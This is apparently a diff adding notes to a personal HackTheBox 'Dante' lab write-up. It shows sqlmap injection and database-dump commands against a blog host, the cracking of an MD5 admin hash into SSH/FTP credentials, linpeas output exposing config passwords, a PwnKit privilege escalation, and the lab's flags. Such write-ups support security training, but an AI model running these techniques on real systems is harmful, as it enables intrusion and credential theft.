@@ -60,3 +60,89 @@ After conducting a directory bruteforce, I found a list of team members.:
 ![](./_resources/HTB_Pro_Lab_Dante.resources/ferox172.txt)
 
 ![](./_resources/HTB_Pro_Lab_Dante.resources/image.30.png)
+
+I found the blog site which may have specific vulnerablities in ExploitDB so I will need to check this out. I need to investigate blogadmin site. Also check the ferox file saved to the Desktop.
+
+```
+http://172.16.1.12/blog/blogadmin/index.php
+```
+
+I found an admin login here:
+```
+http://172.16.1.12/blog/blogadmin/index.php?signIn=1
+```
+
+After running SQLmap on the url showing the "id" paramter (which isn't escaped), I found the following tables.:
+```
+proxychains sqlmap http://172.16.1.12/blog/category.php?id=0 --db --batch
+```
+
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.86.png)
+I got the first flag.:
+```
+proxychains sqlmap http://172.16.1.12/blog/category.php?id=0 --dump -D flag
+```
+
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.87.png)
+
+```
+DANTE{wHy_y0U_n0_s3cURe?!?!}
+```
+
+The SQLmap scans are saved in the following directory.: /home/cl3al/.local/share/sqlmap/output/172.16.1.12/dump/blog\_admin\_db . From here, I cansee the admin user ben and an MD5 hash which I can easily crack with hashcat or John.:
+```
+ben,ben@dante.htb,NULL,NULL,NULL,NULL,442179ad1de9c25593cabf625c0badb7
+```
+
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.88.png)
+
+I used [crackstation.net](http://crackstation.net) to crack the MD5 hashes found very quickly.:
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.89.png)
+I was then able to login via FTP and SSh with:
+```
+uname: ben
+passwd: Welcometomyblog
+```
+I now found the flag in ben's directory!:
+```
+DANTE{Pretty_Horrific_PH4IL!}
+```
+
+I found another user by the name of "Julian".  I will try to see if perhaps I can get linpeas on there. After running linpeas, I found the following information:
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.90.png)
+Raw data:
+```
+══════════╣ Searching passwords in config PHP files
+'adminPassword' => "21232f297a57a5a743894a0e4a801fc3",
+$dbPassword = '';
+$dbUsername = 'root';
+'adminPassword' => "21232f297a57a5a743894a0e4a801fc3",
+$dbPassword = '';
+$dbUsername = 'root';
+// define('DATABASE', 'mssql'); 
+define('DATABASE', 'mysql');
+define('DATABASE', 'mysqli');
+if($passwd === NULL) $passwd = ini_get("mysql.default_password");
+if($passwd === NULL) $passwd = ini_get("mysqli.default_pw");
+define('TABLE_USER',      'mdb_querytool_user');
+        'password' => $_ENV['MYSQL_TEST_PASSWD'],
+        'password' => $_ENV['PGSQL_TEST_PASSWD'],
+$cfg['Servers'][$i]['AllowNoPassword'] = true;
+$cfg['Servers'][$i]['AllowNoPassword'] = false;
+$cfg['Servers'][$i]['AllowNoPassword'] = false;
+$cfg['ShowChgPassword'] = true;
+```
+
+Vulnerabilities (CVEs):
+```
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+
+Potentially Vulnerable to CVE-2022-2588
+```
+
+This CVE is the PNWkit vulnerability which I used the POC exploit tool for. I successfully gained privesc to root and got the last flag for this machine!:
+```
+DANTE{sudo_M4k3_me_@_Sandwich}
+```
